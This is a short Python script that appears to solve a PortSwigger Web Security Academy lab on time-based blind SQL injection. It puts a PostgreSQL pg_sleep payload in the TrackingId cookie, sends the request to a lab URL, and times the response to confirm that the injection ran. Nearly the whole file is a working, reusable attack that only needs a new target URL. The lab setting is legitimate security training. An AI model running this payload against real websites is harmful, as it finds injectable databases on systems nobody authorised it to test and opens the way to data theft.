#!/usr/bin/env python3

import time
import requests

# PortSwigger Web Security Academy lab URL.
LAB_URL = "https://0ac0006d048cf96c809e62e400a40052.web-security-academy.net/product?productId=9"

# Expected delay introduced by pg_sleep().
SLEEP_TIME = 10

# SQL injection payload placed in the TrackingId cookie.
cookies = {
    "TrackingId": f"x'||pg_sleep({SLEEP_TIME})--"
}

print("[*] Sending request with time delay payload...\n")

start = time.time()

try:
    response = requests.get(
        LAB_URL,
        cookies=cookies,
        timeout=SLEEP_TIME + 15
    )

    elapsed = time.time() - start

    print("=" * 50)
    print(f"Status         : {response.status_code}")
    print(f"Response Time  : {elapsed:.2f} seconds")
    print()

    if elapsed >= SLEEP_TIME:
        print(f"[+] Expected delay : {SLEEP_TIME} seconds")
        print(f"[+] Measured delay : {elapsed:.2f} seconds")
        print("[+] The time delay confirms that the SQL injection payload was executed.")
    else:
        print("[-] No significant time delay detected.")
        print("[-] The payload may not have been executed.")

except requests.exceptions.ReadTimeout:
    elapsed = time.time() - start

    print("=" * 50)
    print(f"Response Time  : {elapsed:.2f} seconds")
    print()
    print("[+] The request timed out.")
    print("[+] This strongly indicates that the SQL injection payload executed.")
